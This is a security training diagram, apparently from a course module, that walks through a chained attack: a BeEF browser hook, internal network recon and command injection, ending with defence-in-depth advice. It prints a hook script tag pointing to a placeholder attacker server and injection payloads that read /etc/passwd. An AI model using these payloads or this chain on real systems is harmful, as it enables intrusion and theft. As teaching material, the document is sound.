@@ -1,0 +1,334 @@
++-----------------------------------------------------------------------+
+| **Module 7 --- Multi-Stage Chain Attack**                             |
+|                                                                       |
+| Browser Hooking → Internal Pivot → Command Injection                  |
+|                                                                       |
+| *A03 Injection & A10 SSRF \| BBC Academy / JBI Training*              |
++-----------------------------------------------------------------------+
+
++------------------------+-----+--------------------------------------+
+| **ATTACKER**           |     | **VICTIM\'S ENVIRONMENT**            |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+| +-------------------+  |     | +---------------------------------+  |
+| | **① Setup & Hook  |  |     | | **① Victim Visits the Hooked    |  |
+| | Delivery**        |  |     | | Page**                          |  |
+| |                   |  |     | |                                 |  |
+| | Registers a BeEF  |  |     | | An employee opens an email      |  |
+| | server (already   |  |     | | link,                           |  |
+| | running on VM).   |  |     | |                                 |  |
+| |                   |  |     | | clicks a URL in a message, or   |  |
+| | Obtains the BeEF  |  |     | | visits                          |  |
+| | hook URL:         |  |     | |                                 |  |
+| |                   |  |     | | a site where a stored XSS       |  |
+| | http://\[BeEF-    |  |     | | payload                         |  |
+| | IP\]:3000/hook.js |  |     | |                                 |  |
+| |                   |  |     | | has already been injected.      |  |
+| | Chooses a         |  |     | |                                 |  |
+| | delivery method:  |  |     | | The page loads normally --- no  |  |
+| |                   |  |     | | visible                         |  |
+| | \(a\) Inject into |  |     | |                                 |  |
+| | a page via stored |  |     | | sign that anything is wrong.    |  |
+| | XSS, or           |  |     | +---------------------------------+  |
+| |                   |  |     |                                      |
+| | \(b\) Craft a     |  |     |                                      |
+| | phishing page     |  |     |                                      |
+| | containing        |  |     |                                      |
+| |                   |  |     |                                      |
+| | a \<script        |  |     |                                      |
+| | src=\"hook.js\"\> |  |     |                                      |
+| | tag.              |  |     |                                      |
+| +-------------------+  |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        | **  |                                      |
+|                        | ▼** |                                      |
+|                        |     |                                      |
+|                        | **B |                                      |
+|                        | row |                                      |
+|                        | ser |                                      |
+|                        | f   |                                      |
+|                        | etc |                                      |
+|                        | hes |                                      |
+|                        | hoo |                                      |
+|                        | k.j |                                      |
+|                        | s** |                                      |
+|                        |     |                                      |
+|                        | G   |                                      |
+|                        | ain |                                      |
+|                        | ed: |                                      |
+|                        | JS  |                                      |
+|                        | exe |                                      |
+|                        | cut |                                      |
+|                        | ion |                                      |
+|                        | in  |                                      |
+|                        | vic |                                      |
+|                        | tim |                                      |
+|                        | b   |                                      |
+|                        | row |                                      |
+|                        | ser |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+| +-------------------+  |     | +---------------------------------+  |
+| | **② BeEF Console  |  |     | | **② Browser Registers with BeEF |  |
+| | --- New Zombie**  |  |     | | C2**                            |  |
+| |                   |  |     | |                                 |  |
+| | BeEF UI shows the |  |     | | hook.js runs silently. It opens |  |
+| | victim browser    |  |     | |                                 |  |
+| |                   |  |     | | a persistent HTTP polling loop  |  |
+| | has registered as |  |     | |                                 |  |
+| | a new zombie.     |  |     | | back to the BeEF server.        |  |
+| |                   |  |     | |                                 |  |
+| | Attacker can now  |  |     | | Looks like normal AJAX traffic. |  |
+| | see:              |  |     | |                                 |  |
+| |                   |  |     | | No firewall alert. No antivirus |  |
+| | Browser type &    |  |     | |                                 |  |
+| | version           |  |     | | detection. Browser is now a     |  |
+| |                   |  |     | |                                 |  |
+| | OS platform       |  |     | | remotely controlled zombie.     |  |
+| |                   |  |     | +---------------------------------+  |
+| | Installed plugins |  |     |                                      |
+| |                   |  |     |                                      |
+| | Cookies           |  |     |                                      |
+| | (non-HttpOnly)    |  |     |                                      |
+| +-------------------+  |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        | **  |                                      |
+|                        | ▼** |                                      |
+|                        |     |                                      |
+|                        | *   |                                      |
+|                        | *C2 |                                      |
+|                        | c   |                                      |
+|                        | han |                                      |
+|                        | nel |                                      |
+|                        | o   |                                      |
+|                        | ver |                                      |
+|                        | H   |                                      |
+|                        | TTP |                                      |
+|                        | pol |                                      |
+|                        | lin |                                      |
+|                        | g** |                                      |
+|                        |     |                                      |
+|                        | G   |                                      |
+|                        | ain |                                      |
+|                        | ed: |                                      |
+|                        | p   |                                      |
+|                        | ers |                                      |
+|                        | ist |                                      |
+|                        | ent |                                      |
+|                        | b   |                                      |
+|                        | row |                                      |
+|                        | ser |                                      |
+|                        | c   |                                      |
+|                        | ont |                                      |
+|                        | rol |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+| +-------------------+  |     | +---------------------------------+  |
+| | **③ Internal      |  |     | | **③ Browser Scans Internal      |  |
+| | Recon Commands**  |  |     | | Network**                       |  |
+| |                   |  |     | |                                 |  |
+| | In BeEF\'s        |  |     | | BeEF commands execute as        |  |
+| | command module    |  |     | |                                 |  |
+| | panel,            |  |     | | JavaScript in the victim\'s     |  |
+| |                   |  |     | | browser.                        |  |
+| | attacker issues:  |  |     | |                                 |  |
+| |                   |  |     | | Browser makes HTTP requests to  |  |
+| | Network Discovery |  |     | |                                 |  |
+| |                   |  |     | | internal IP ranges (10.x,       |  |
+| | Port Scanner      |  |     | | 192.168.x)                      |  |
+| |                   |  |     | |                                 |  |
+| | Internal host     |  |     | | that are blocked from the       |  |
+| | ping sweep        |  |     | | internet.                       |  |
+| |                   |  |     | |                                 |  |
+| | These run inside  |  |     | | Results sent back to attacker   |  |
+| | the victim        |  |     | |                                 |  |
+| | browser.          |  |     | | via the C2 polling channel.     |  |
+| |                   |  |     | +---------------------------------+  |
+| | The browser has   |  |     |                                      |
+| | LAN access the    |  |     |                                      |
+| |                   |  |     |                                      |
+| | attacker cannot   |  |     |                                      |
+| | reach directly.   |  |     |                                      |
+| +-------------------+  |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        | **  |                                      |
+|                        | ▼** |                                      |
+|                        |     |                                      |
+|                        | **B |                                      |
+|                        | row |                                      |
+|                        | ser |                                      |
+|                        | piv |                                      |
+|                        | ots |                                      |
+|                        | to  |                                      |
+|                        | in  |                                      |
+|                        | ter |                                      |
+|                        | nal |                                      |
+|                        | ne  |                                      |
+|                        | t** |                                      |
+|                        |     |                                      |
+|                        | G   |                                      |
+|                        | ain |                                      |
+|                        | ed: |                                      |
+|                        | acc |                                      |
+|                        | ess |                                      |
+|                        | to  |                                      |
+|                        | in  |                                      |
+|                        | ter |                                      |
+|                        | nal |                                      |
+|                        | ho  |                                      |
+|                        | sts |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+| **NETWORK BOUNDARY**   |     |                                      |
+| Internet               |     |                                      |
+| ←-------               |     |                                      |
+| ---------------------- |     |                                      |
+| ---------------------- |     |                                      |
+| ---------------------→ |     |                                      |
+| Internal Corporate     |     |                                      |
+| Network / Cloud        |     |                                      |
+| Environment            |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+| +-------------------+  |     | +---------------------------------+  |
+| | **④ Craft         |  |     | | **④ Internal Server: Command    |  |
+| | Injection         |  |     | | Executes**                      |  |
+| | Payload**         |  |     | |                                 |  |
+| |                   |  |     | | The internal server\'s web app  |  |
+| | Recon reveals an  |  |     | |                                 |  |
+| | internal server   |  |     | | calls os.popen() with the       |  |
+| |                   |  |     | |                                 |  |
+| | running a web app |  |     | | unsanitised input.              |  |
+| | with a ping       |  |     | |                                 |  |
+| |                   |  |     | | The OS shell interprets ; as    |  |
+| | utility ---       |  |     | |                                 |  |
+| | vulnerable to     |  |     | | a command separator.            |  |
+| | command           |  |     | |                                 |  |
+| |                   |  |     | | Command output is returned      |  |
+| | injection (as in  |  |     | |                                 |  |
+| | ShopCo Flaw 8).   |  |     | | in the HTTP response, which     |  |
+| |                   |  |     | |                                 |  |
+| | Attacker crafts   |  |     | | the browser forwards back       |  |
+| | the payload:      |  |     | |                                 |  |
+| |                   |  |     | | through the BeEF C2 channel     |  |
+| | 127.0.0.1; id     |  |     | |                                 |  |
+| |                   |  |     | | to the attacker.                |  |
+| | 127.0.0.1; cat    |  |     | +---------------------------------+  |
+| | /etc/passwd       |  |     |                                      |
+| |                   |  |     |                                      |
+| | Issues via        |  |     |                                      |
+| | BeEF\'s GET/POST  |  |     |                                      |
+| |                   |  |     |                                      |
+| | command module    |  |     |                                      |
+| | targeting the     |  |     |                                      |
+| |                   |  |     |                                      |
+| | internal server   |  |     |                                      |
+| | URL.              |  |     |                                      |
+| +-------------------+  |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        | **  |                                      |
+|                        | ▼** |                                      |
+|                        |     |                                      |
+|                        | **  |                                      |
+|                        | A03 |                                      |
+|                        | C   |                                      |
+|                        | omm |                                      |
+|                        | and |                                      |
+|                        | In  |                                      |
+|                        | jec |                                      |
+|                        | tio |                                      |
+|                        | n** |                                      |
+|                        |     |                                      |
+|                        | G   |                                      |
+|                        | ain |                                      |
+|                        | ed: |                                      |
+|                        | OS  |                                      |
+|                        | c   |                                      |
+|                        | omm |                                      |
+|                        | and |                                      |
+|                        | exe |                                      |
+|                        | cut |                                      |
+|                        | ion |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+| +-------------------+  |     | +---------------------------------+  |
+| | **⑤ Attacker\'s   |  |     | | **⑤ Impact on the               |  |
+| | Outcome**         |  |     | | Organisation**                  |  |
+| |                   |  |     | |                                 |  |
+| | Can now run       |  |     | | Internal server compromised     |  |
+| | arbitrary         |  |     | |                                 |  |
+| | commands          |  |     | | without the attacker ever       |  |
+| |                   |  |     | |                                 |  |
+| | on the internal   |  |     | | directly touching the network.  |  |
+| | server as the     |  |     | |                                 |  |
+| |                   |  |     | | The attack path:                |  |
+| | web               |  |     | |                                 |  |
+| | application\'s OS |  |     | | Phishing email                  |  |
+| | user.             |  |     | |                                 |  |
+| |                   |  |     | | → browser hook                  |  |
+| | Next steps in a   |  |     | |                                 |  |
+| | real attack:      |  |     | | → internal pivot                |  |
+| |                   |  |     | |                                 |  |
+| | Read credential   |  |     | | → command injection             |  |
+| | files             |  |     | |                                 |  |
+| |                   |  |     | | → OS access                     |  |
+| | Enumerate         |  |     | |                                 |  |
+| | database config   |  |     | | Traditional perimeter defences  |  |
+| |                   |  |     | |                                 |  |
+| | Establish reverse |  |     | | (firewalls, VPNs) did not help. |  |
+| | shell             |  |     | +---------------------------------+  |
+| |                   |  |     |                                      |
+| | Move laterally to |  |     |                                      |
+| | other hosts       |  |     |                                      |
+| |                   |  |     |                                      |
+| | Exfiltrate data   |  |     |                                      |
+| +-------------------+  |     |                                      |
++------------------------+-----+--------------------------------------+
+|                        |     |                                      |
++------------------------+-----+--------------------------------------+
+
+**Enabling Vulnerabilities --- What Makes Each Stage Possible**
+
+  ----------------------- ----------------------- -----------------------
+  **Enabling              **Capability Gained**   **Primary OWASP
+  Vulnerability**                                 Category**
+
+  XSS (Stored or          JavaScript execution in A03:2025 Injection
+  Reflected) in hook      victim\'s browser       
+  delivery page                                   
+
+  No HttpOnly flag on     Session cookies         A02:2025 Cryptographic
+  session cookies         readable by hook script Failures
+
+  Browser\'s trusted      Access to internal      A10:2025 SSRF
+  network position (by    hosts blocked from      (Server-Side concept
+  design)                 internet                applied client-side)
+
+  Command Injection in    Arbitrary OS command    A03:2025 Injection
+  internal server         execution on internal   
+  (os.popen + input)      server                  
+  ----------------------- ----------------------- -----------------------
+
+  -----------------------------------------------------------------------
+  **The key insight:** no single vulnerability achieves this --- the
+  chain requires XSS **and** command injection **and** the browser\'s
+  trusted network position. Fixing any one link breaks the chain. This is
+  why defence-in-depth matters: HttpOnly cookies limit XSS impact, input
+  validation prevents command injection, and network segmentation limits
+  lateral movement even if both attacks succeed.
+
+  -----------------------------------------------------------------------
